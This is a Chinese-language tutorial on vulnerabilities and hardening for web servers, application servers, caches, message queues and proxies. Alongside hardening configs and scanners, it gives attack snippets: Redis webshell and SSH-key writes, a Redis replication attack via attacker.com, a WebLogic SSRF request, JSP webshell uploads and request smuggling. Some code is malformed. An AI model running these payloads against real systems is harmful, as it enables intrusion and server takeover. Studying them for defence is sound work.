# 中间件漏洞

## 1. 中间件漏洞概述

### 1.1 基本概念

中间件漏洞是指Web服务器、应用服务器、消息队列、缓存系统等中间件组件中存在的安全缺陷，攻击者可以利用这些漏洞获取系统权限、执行任意代码或破坏服务可用性。

### 1.2 中间件分类

- **Web服务器**：Apache、Nginx、IIS

- **应用服务器**：Tomcat、WebLogic、WebSphere、JBoss

- **缓存系统**：Redis、Memcached

- **消息队列**：RabbitMQ、ActiveMQ、Kafka

- **代理服务器**：HAProxy、Squid

## 2. Web服务器漏洞

### 2.1 Apache漏洞

#### 2.1.1 模块漏洞

```bash
# 检查启用的模块

apache2ctl -M

# 常见漏洞模块

mod_ssl - SSL/TLS相关漏洞
mod_cgi - 命令执行漏洞
mod_rewrite - 规则绕过漏洞
```

#### 2.1.2 解析漏洞

```apacheconf
# 多后缀解析漏洞配置

<FilesMatch "\.php"> SetHandler application/x-httpd-php</FilesMatch>

# 攻击者可以上传 shell.php.jpg 被解析为PHP 
```

#### 2.1.3 目录遍历

```apacheconf
# 错误的配置允许目录遍历

<Directory "/var/www/html"> Options Indexes FollowSymLinks
 AllowOverride None
 Require all granted
</Directory>
```

#### 2.1.4 安全配置

```apacheconf
# 安全Apache配置
ServerTokens Prod
ServerSignature Off
TraceEnable Off

# 禁用危险模块
LoadModule cgi_module modules/mod_cgi.so  # 谨慎启用

# 文件保护
<FilesMatch "\.(env|git|svn|htaccess)">
    Order allow,deny
    Deny from all
</FilesMatch>

# 限制HTTP方法
<LimitExcept GET POST>
    Deny from all
</LimitExcept>
```

### 2.2 Nginx漏洞

#### 2.2.1 配置错误漏洞

```nginx
# 不安全的静态文件配置

location /static/ {
 alias /home/;
 # 可能造成目录遍历：/static../etc/passwd
}

# 正确的配置

location /static/ {
 root /var/www/html;
 try_files $uri $uri/ =404;
}
```

#### 2.2.2 解析漏洞

```nginx
# PHP解析漏洞配置
location ~ \.php$ {
    fastcgi_pass 127.0.0.1:9000;
    include fastcgi_params;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
}

# 可能被绕过：test.jpg%00.php
```

#### 2.2.3 路径遍历

```nginx
# 错误的alias配置导致路径遍历

location /files/ {
 alias /var/www/;
 # 访问 /files../etc/passwd 可读取系统文件
}
```

#### 2.2.4 安全配置

```nginx
server {
 # 基础安全
 server_tokens off;

# 路径遍历防护
location ~ /\. {
    deny all;
    access_log off;
    log_not_found off;
}

# 限制请求类型
if ($request_method !~ ^(GET|HEAD|POST)$ ) {
    return 444;
}

# 文件上传目录禁用脚本执行
location ~* /uploads/.*\.php$ {
    deny all;
}

# 隐藏敏感文件
location ~* \.(env|git|svn|htaccess|bak|save)$ {
    deny all;
}

}
```

### 2.3 IIS漏洞

#### 2.3.1 解析漏洞

```xml
<!-- IIS 6.0 解析漏洞 -->
<!-- test.asp;.jpg 会被解析为ASP -->
<!-- test.asp/.jpg 会被解析为ASP -->
```

<!-- IIS 6.0 解析漏洞 -->

<!-- test.asp;.jpg 会被解析为ASP -->

<!-- test.asp/.jpg 会被解析为ASP -->

#### 2.3.2 短文件名漏洞

```bash
# 探测IIS短文件名
# 访问 /api~1/.aspx 如果返回404则存在
curl -I http://target.com/api~1/.aspx
```

#### 2.3.3 WebDAV漏洞

```http
PROPFIND / HTTP/1.1
Host: target.com
Content-Type: application/xml
Content-Length: 123
<?xml version="1.0"?>
<D:propfind xmlns:D="DAV:">
 <D:allprop/>
</D:propfind>
```

## 3. 应用服务器漏洞

### 3.1 Tomcat漏洞

#### 3.1.1 弱口令和默认凭证

```bash
# 常见Tomcat默认凭证

admin:admin
tomcat:tomcat
admin:空密码
```

#### 3.1.2 Manager App漏洞

```bash
# 通过Manager部署WAR文件

curl -u admin:password -X PUT \
 "http://target.com/manager/text/deploy?path=/shell" \
 --data-binary @shell.war 
```

#### 3.1.3 AJP协议漏洞（Ghostcat）

```java
// CVE-2020-1938 AJP文件读取/包含
// 攻击者可以通过AJP协议读取webapp目录下的任意文件
```

#### 3.1.4 安全配置

```xml
<!-- conf/tomcat-users.xml 安全配置 -->
<tomcat-users>
    <!-- 删除默认用户 -->
    <!-- 使用强密码 -->
    <user username="admin" password="加密密码" 
          roles="manager-gui,admin-gui"/>
</tomcat-users>

<!-- server.xml 安全配置 -->
<Server port="8005" shutdown="SHUTDOWN">
    <!-- 修改关闭端口和口令 -->
</Server>

<!-- 禁用AJP连接器或限制访问 -->
<Connector port="8009" protocol="AJP/1.3" 
           address="127.0.0.1" 
           secretRequired="true"/>
```

<!-- conf/tomcat-users.xml 安全配置 -->

### 3.2 WebLogic漏洞

#### 3.2.1 反序列化漏洞

```java
// CVE-2015-4852 等反序列化漏洞
// 攻击者可以通过T3协议发送恶意序列化数据
```

#### 3.2.2 未授权访问

```http
# 控制台未授权访问
GET /console/login/LoginForm.jsp HTTP/1.1
Host: target.com
```

#### 3.2.3 SSRF漏洞

```http
# CVE-2014-4210 UDP SSRF
GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://attacker.com&rdoSearch=name&txtSearchname=s&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search HTTP/1.1
```

### 3.3 JBoss漏洞

#### 3.3.1 JMX Console未授权访问

```http
# 访问JMX控制台

GET /jmx-console/ HTTP/1.1
Host: target.com
```

#### 3.3.2 反序列化漏洞

```java
// JBoss JMXInvokerServlet 反序列化
POST /invoker/JMXInvokerServlet HTTP/1.1
Content-Type: application/x-java-serialized-object

[恶意序列化数据]
```

## 4. 缓存系统漏洞

### 4.1 Redis漏洞

#### 4.1.1 未授权访问

```bash
# 直接连接Redis
redis-cli -h target.com

# 执行命令
info
keys *
config set dir /var/www/html
config set dbfilename shell.php
set test "<?php system($_GET['cmd']); ?>"
save
```

#### 4.1.2 主从复制攻击

```bash
# 通过主从复制写入恶意模块

redis-cli -h target.com
slaveof attacker.com 6379
config set dir /tmp
module load /tmp/exp.so 
```

#### 4.1.3 SSH密钥写入

```bash
通过Redis写入SSH公钥

redis-cli -h target.com
config set dir /root/.ssh/
config set dbfilename "authorized_keys"
set test "ssh-rsa AAAAB3NzaC1yc2E..."
save
```

#### 4.1.4 安全配置

```roboconf
redis.conf 安全配置

bind 127.0.0.1
protected-mode yes
port 6379
requirepass "StrongPassword123!"

# 重命名危险命令

rename-command FLUSHALL ""
rename-command FLUSHDB ""
rename-command CONFIG ""
rename-command SHUTDOWN ""
rename-command DEBUG ""

# 限制内存和连接

maxmemory 1gb
maxclients 10000
timeout 300
```

### 4.2 Memcached漏洞

#### 4.2.1 未授权访问

```bash
# 连接Memcached

telnet target.com 11211

# 执行命令

stats
stats items
get key
```

#### 4.2.2 放大攻击

```bash
# Memcached可用于DDoS放大攻击
# 小请求产生大响应
echo -e "set test 0 0 10\r\nAAAAAAAAAA\r\nget test" | nc target.com 11211
```

#### 4.2.3 安全配置

```roboconf
# 绑定本地地址
-l 127.0.0.1

# 使用SASL认证
-S
```

## 5. 消息队列漏洞

### 5.1 RabbitMQ漏洞

#### 5.1.1 默认凭证

```bash
常见默认凭证

guest:guest 
```

#### 5.1.2 未授权访问

```http
管理界面未授权访问

GET /api/overview HTTP/1.1
Host: target.com:15672 
```

#### 5.1.3 安全配置

```roboconf
# 修改默认端口

listeners.tcp.default = 5672
management.tcp.port = 15672

# 禁用guest用户或限制访问

loopback_users.guest = false

# 使用SSL

ssl_options.cacertfile = /path/to/ca_certificate.pem
ssl_options.certfile = /path/to/server_certificate.pem
ssl_options.keyfile = /path/to/server_key.pem
ssl_options.verify = verify_peer
ssl_options.fail_if_no_peer_cert = false 
```

### 5.2 ActiveMQ漏洞

#### 5.2.1 文件上传漏洞

```http
# CVE-2016-3088 文件上传

PUT /fileserver/shell.jsp HTTP/1.1
Host: target.com:8161
Content-Length: 123

<% Runtime.getRuntime().exec("cmd"); %> 
```

#### 5.2.2 反序列化漏洞

```java
// 通过OpenWire协议发送恶意序列化数据
```

## 6. 代理服务器漏洞

### 6.1 HAProxy漏洞

#### 6.1.1 请求走私

```http
# HTTP请求走私
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

12
GET /admin HTTP/1.1

0
```

#### 6.1.2 安全配置

```roboconf
# HAProxy安全配置
global
    tune.ssl.default-dh-param 2048

defaults
    option forwardfor
    option http-server-close
    timeout connect 5s
    timeout client 50s
    timeout server 50s

frontend http_in
    bind *:80
    mode http

    # 安全头
    http-response set-header X-Frame-Options DENY
    http-response set-header X-Content-Type-Options nosniff
    http-response set-header X-XSS-Protection "1; mode=block"

    # 限制请求大小
    timeout http-request 5s
    http-request deny if { req.body_size gt 1000000 }
```

## 7. 漏洞检测方法

### 7.1 自动化扫描工具

#### 7.1.1 中间件识别

```python
import requests

class MiddlewareScanner:
 def __init__(self, target_url):
 self.target_url = target_url
 self.session = requests.Session()


def detect_server(self):
    """检测Web服务器类型"""
    response = self.session.get(self.target_url)
    headers = response.headers

    server_headers = {
        'Server': headers.get('Server', ''),
        'X-Powered-By': headers.get('X-Powered-By', ''),
        'X-AspNet-Version': headers.get('X-AspNet-Version', '')
    }

    # 基于响应头识别
    if 'Apache' in server_headers['Server']:
        return 'Apache'
    elif 'nginx' in server_headers['Server']:
        return 'Nginx'
    elif 'IIS' in server_headers['Server']:
        return 'IIS'
    elif 'Tomcat' in server_headers['Server']:
        return 'Tomcat'

    return 'Unknown'

def check_default_paths(self):
    """检查默认路径和文件"""
    default_paths = {
        'Tomcat': [
            '/manager/html',
            '/host-manager/html',
            '/docs/',
            '/examples/'
        ],
        'WebLogic': [
            '/console/login/LoginForm.jsp',
            /uddiexplorer/'
        ],
        'JBoss': [
            '/jmx-console/',
            '/web-console/',
            '/invoker/JMXInvokerServlet'
        ],
        'Jenkins': [
            '/jenkins/',
            '/script'
        ]
    }

    found_paths = []
    server_type = self.detect_server()

    if server_type in default_paths:
        for path in default_paths[server_type]:
            url = f"{self.target_url}{path}"
            response = self.session.get(url)

            if response.status_code == 200:
                found_paths.append({
                    'path': path,
                    'url': url,
                    'status': response.status_code
                })

    return found_paths

def test_redis_unauth(self):
    """测试Redis未授权访问"""
    try:
        import redis
        r = redis.Redis(host=self.target_url, port=6379, socket_connect_timeout=3)
        info = r.info()
        return True
    except:
        return False

def test_memcached_unauth(self):
    """测试Memcached未授权访问"""
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((self.target_url, 11211))
        s.send(b"stats\r\n")
        response = s.recv(1024)
        s.close()

        if b"STAT" in response:
            return True
    except:
        pass

    return False
```

#### 7.1.2 配置漏洞检测

```python
import subprocess
import re

class ConfigurationScanner:
 def check_apache_config(self, config_path='/etc/apache2/'):
 """检查Apache配置漏洞"""
 vulnerabilities = []

    # 检查启用的模块
    try:
        result = subprocess.run(['apache2ctl', '-M'], capture_output=True, text=True)
        modules = result.stdout

        dangerous_modules = ['mod_cgi', 'mod_include', 'mod_userdir']
        for module in dangerous_modules:
            if module in modules:
                vulnerabilities.append(f"危险模块启用: {module}")
    except:
        pass

    # 检查目录遍历
    try:
        with open(f"{config_path}/apache2.conf", 'r') as f:
            config = f.read()

        if "Options Indexes" in config:
            vulnerabilities.append("目录列表功能启用")

        if "AllowOverride None" not in config:
            vulnerabilities.append("AllowOverride配置不安全")

    except Exception as e:
        vulnerabilities.append(f"配置文件读取失败: {str(e)}")

    return vulnerabilities

def check_nginx_config(self, config_path='/etc/nginx/'):
    """检查Nginx配置漏洞"""
    vulnerabilities = []

    try:
        # 检查解析配置
        with open(f"{config_path}/nginx.conf", 'r') as f:
            config = f.read()

        # 检查路径遍历漏洞
        if "alias" in config and "../" not in config:
            vulnerabilities.append("可能存在路径遍历漏洞")

        # 检查PHP解析配置
        php_pattern = r'location\s+~\s*\\\.php'
        if re.search(php_pattern, config):
            vulnerabilities.append("PHP解析配置可能存在漏洞")

    except Exception as e:
        vulnerabilities.append(f"配置文件读取失败: {str(e)}")

    return vulnerabilities
```

### 7.2 手动检测方法

#### 7.2.1 版本信息收集

```bash
获取服务器版本信息

curl -I http://target.com
nmap -sV -p 80,443,8080 target.com
whatweb http://target.com

# 检查特定服务

nmap --script redis-info -p 6379 target.com
nmap --script memcached-info -p 11211 target.com
```

#### 7.2.2 默认路径测试

```bash
# Tomcat默认路径
curl http://target.com/manager/html
curl http://target.com/host-manager/html

# JBoss默认路径  
curl http://target.com/jmx-console/
curl http://target.com/web-console/

# WebLogic默认路径
curl http://target.com/console/
curl http://target.com/uddiexplorer/
```

## 8. 防御措施

### 8.1 通用安全原则

#### 8.1.1 最小权限原则

```bash
使用非root用户运行服务

useradd -r -s /bin/false tomcat
chown -R tomcat:tomcat /opt/tomcat

# 限制文件权限

chmod 750 /opt/tomcat/bin/
chmod 640 /opt/tomcat/conf/* 
```

#### 8.1.2 网络访问控制

```bash
# 使用防火墙限制访问
iptables -A INPUT -p tcp --dport 8080 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 8080 -j DROP

# 绑定本地地址
# 在配置文件中设置 bind 127.0.0.1
```

### 8.2 特定中间件加固

#### 8.2.1 Tomcat安全加固

```xml
<!-- server.xml 安全配置 -->
<Server port="8005" shutdown="SHUTDOWN" address="127.0.0.1">

    <!-- 禁用AJP或限制访问 -->
    <Connector port="8009" protocol="AJP/1.3" 
               address="127.0.0.1" 
               secretRequired="true"/>

    <!-- HTTP连接器安全配置 -->
    <Connector port="8080" protocol="HTTP/1.1"
               maxThreads="150"
               connectionTimeout="20000"
               maxHttpHeaderSize="8192"
               server="Unknown"/>
</Server>

<!-- web.xml 安全配置 -->
<web-app>
    <!-- 禁用目录列表 -->
    <init-param>
        <param-name>listings</param-name>
        <param-value>false</param-value>
    </init-param>

    <!-- 添加安全头 -->
    <filter>
        <filter-name>httpHeaderSecurity</filter-name>
        <filter-class>org.apache.catalina.filters.HttpHeaderSecurityFilter</filter-class>
        <init-param>
            <param-name>antiClickJackingEnabled</param-name>
            <param-value>true</param-value>
        </init-param>
    </filter>
</web-app>
```

<!-- server.xml 安全配置 -->

#### 8.2.2 Redis安全加固

```roboconf
redis.conf 安全配置

# 网络安全

bind 127.0.0.1
protected-mode yes
port 6379

# 认证

requirepass "StrongRedisPassword123!"

# 命令重命名

rename-command FLUSHALL ""
rename-command FLUSHDB ""
rename-command CONFIG ""
rename-command SHUTDOWN ""
rename-command DEBUG ""

# 资源限制

maxmemory 1gb
maxclients 10000
timeout 300

# 持久化安全

dir /var/lib/redis/
dbfilename dump.rdb
```

#### 8.2.3 Nginx安全加固

```nginx
nginx.conf 安全配置

# 隐藏版本信息

server_tokens off;

# 安全头

add_header X-Frame-Options DENY;
add_header X-Content-Type-Options nosniff;
add_header X-XSS-Protection "1; mode=block";
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains";

# 限制请求大小

client_max_body_size 10M;
client_body_timeout 10;
client_header_timeout 10;

# 限制请求速率

limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;

# 文件访问控制

location ~ /\. {
 deny all;
 access_log off;
 log_not_found off;
}

location ~* \.(env|git|svn|htaccess|bak)$ {
 deny all;
} 
```

### 8.3 持续安全监控

#### 8.3.1 配置变更监控

```python
import hashlib
import os
from datetime import datetime

class ConfigMonitor:
 def __init__(self, config_files):
 self.config_files = config_files
 self.baseline = self.create_baseline()

def create_baseline(self):
    """创建配置文件的基线哈希"""
    baseline = {}
    for config_file in self.config_files:
        if os.path.exists(config_file):
            with open(config_file, 'rb') as f:
                file_hash = hashlib.sha256(f.read()).hexdigest()
            baseline[config_file] = file_hash
    return baseline

def check_integrity(self):
    """检查配置文件完整性"""
    alerts = []
    for config_file, expected_hash in self.baseline.items():
        if not os.path.exists(config_file):
            alerts.append(f"配置文件丢失: {config_file}")
            continue

        with open(config_file, 'rb') as f:
            current_hash = hashlib.sha256(f.read()).hexdigest()

        if current_hash != expected_hash:
            alerts.append(f"配置文件被修改: {config_file}")

    return alerts

def monitor_continuously(self):
    """持续监控配置变更"""
    while True:
        alerts = self.check_integrity()
        if alerts:
            for alert in alerts:
                self.send_alert(alert)

        time.sleep(300)  # 每5分钟检查一次

def send_alert(self, message):
    """发送警报"""
    timestamp = datetime.now().isoformat()
    print(f"[{timestamp}] CONFIG ALERT: {message}")
```

#### 8.3.2 服务状态监控

```python
import psutil
import requests

class ServiceMonitor:
 def __init__(self, services):
 self.services = services


def check_service_status(self):
    """检查服务状态"""
    alerts = []

    for service in self.services:
        try:
            # 检查进程是否存在
            for proc in psutil.process_iter(['name']):
                if service['name'] in proc.info['name']:
                    break
            else:
                alerts.append(f"服务未运行: {service['name']}")
                continue

            # 检查服务响应
            if 'url' in service:
                try:
                    response = requests.get(service['url'], timeout=5)
                    if response.status_code != 200:
                        alerts.append(f"服务响应异常: {service['name']} - HTTP {response.status_code}")
                except requests.exceptions.RequestException as e:
                    alerts.append(f"服务无法访问: {service['name']} - {str(e)}")

        except Exception as e:
            alerts.append(f"服务检查失败: {service['name']} - {str(e)}")

    return alerts
```

## 9. 应急响应

### 9.1 中间件漏洞应急响应

#### 9.1.1 检测到漏洞利用

```bash
#!/bin/bash

# 中间件漏洞应急响应脚本

echo "=== Middleware Vulnerability Incident Response ==="

# 1. 立即隔离系统

echo "1. Isolating affected system..."
iptables -A INPUT -p tcp --dport 8080 -j DROP
systemctl stop tomcat

# 2. 备份证据

echo "2. Preserving evidence..."
tar czf /tmp/incident_evidence_$(date +%s).tar.gz \
 /var/log/tomcat/ \
 /opt/tomcat/logs/ \
 /opt/tomcat/webapps/

# 3. 检查后门文件

echo "3. Checking for backdoors..."
find /opt/tomcat/webapps/ -name "*.jsp" -exec grep -l "Runtime.getRuntime\|ProcessBuilder" {} \;
find /tmp /var/tmp -name "*.war" -o -name "*.jsp"

# 4. 分析日志

echo "4. Analyzing logs..."
grep -r "shell\|cmd\|runtime" /var/log/tomcat/
lastlog

# 5. 修复漏洞

echo "5. Applying fixes..."

# 更新中间件版本

# 修改配置文件

# 移除恶意文件

# 6. 恢复服务

echo "6. Restoring service..."
systemctl start tomcat
iptables -D INPUT -p tcp --dport 8080 -j DROP
```

#### 9.1.2 漏洞修复验证

```python
class VulnerabilityVerification:
 def verify_fix(self, vulnerability, target):
 """验证漏洞修复是否有效"""
 test_cases = self.generate_test_cases(vulnerability)

    all_fixed = True
    for test_case in test_cases:
        if self.test_vulnerability(target, test_case):
            print(f"漏洞仍然存在: {test_case['description']}")
            all_fixed = False

    if all_fixed:
        print("所有漏洞测试通过，修复成功")
    else:
        print("部分漏洞仍然存在，需要进一步修复")

    return all_fixed

def test_redis_unauth(self, target):
    """测试Redis未授权访问是否修复"""
    try:
        import redis
        r = redis.Redis(host=target, port=6379, socket_connect_timeout=3)
        r.ping()
        return True  # 仍然可以连接
    except redis.exceptions.ConnectionError:
        return False  # 连接被拒绝
    except redis.exceptions.AuthenticationError:
        return False  # 需要认证
    except:
        return False

def test_tomcat_manager(self, target):
    """测试Tomcat Manager是否安全"""
    test_urls = [
        f"http://{target}:8080/manager/html",
        f"http://{target}:8080/host-manager/html"
    ]

    for url in test_urls:
        response = requests.get(url)
        if response.status_code == 200:
            # 检查是否需要认证
            if 'login' not in response.text.lower():
                return True  # 存在未授权访问

    return False
```

## 10. 最佳实践总结

### 10.1 安全配置清单

```yaml
middleware_security_checklist:
 general:
 - use_non_privileged_user: true
 - minimal_installation: true
 - regular_updates: true
 - network_segmentation: true

web_servers:
 apache:
 - hide_version_info: true
 - disable_dangerous_modules: true
 - secure_directory_listing: true
 - limit_http_methods: true
nginx:

- server_tokens_off: true

- path_traversal_protection: true

- secure_file_handling: true

- request_limiting: true


application_servers:
 tomcat:

- strong_passwords: true
- disable_default_apps: true
- secure_ajp_connector: true
- security_headers: true
weblogic:

- secure_console_access: true

- disable_t3_protocol: true

- patch_management: true


caching_services:
 redis:

- authentication_enabled: true
- bind_localhost: true
- rename_dangerous_commands: true
- network_isolation: true
```

memcached:

- bind_localhost: true
- firewall_protection: true
- sasl_authentication: true
  
  ```
  
  ```

monitoring:

- config_integrity_monitoring: true

- service_health_monitoring: true

- security_logging: true

- intrusion_detection: true
  
  ```
  
  ```

### 10.2 自动化安全扫描

```python
class AutomatedSecurityScan:
 def __init__(self):
 self.scanners = {
 'apache': ApacheScanner(),
 'nginx': NginxScanner(),
 'tomcat': TomcatScanner(),
 'redis': RedisScanner()
 }

def run_comprehensive_scan(self, target):
    """运行全面的安全扫描"""
    results = {}

    # 识别中间件类型
    middleware_type = self.identify_middleware(target)

    if middleware_type in self.scanners:
        scanner = self.scanners[middleware_type]
        results = scanner.scan(target)

    # 通用漏洞检查
    results['general'] = self.check_general_vulnerabilities(target)

    return results

def identify_middleware(self, target):
    """识别中间件类型"""
    try:
        response = requests.get(f"http://{target}", timeout=5)
        headers = response.headers

        if 'Server' in headers:
            server_header = headers['Server'].lower()
            if 'apache' in server_header:
                return 'apache'
            elif 'nginx' in server_header:
                return 'nginx'
            elif 'tomcat' in server_header:
                return 'tomcat'

        # 基于端口扫描识别
        open_ports = self.scan_ports(target)
        if 6379 in open_ports:
            return 'redis'
        elif 11211 in open_ports:
            return 'memcached'

    except:
        pass

    return 'unknown'

def scan_ports(self, target):
    """扫描开放端口"""
    import socket
    common_ports = [80, 443, 8080, 8443, 6379, 11211, 27017]
    open_ports = []

    for port in common_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except:
            pass

    return open_ports
```
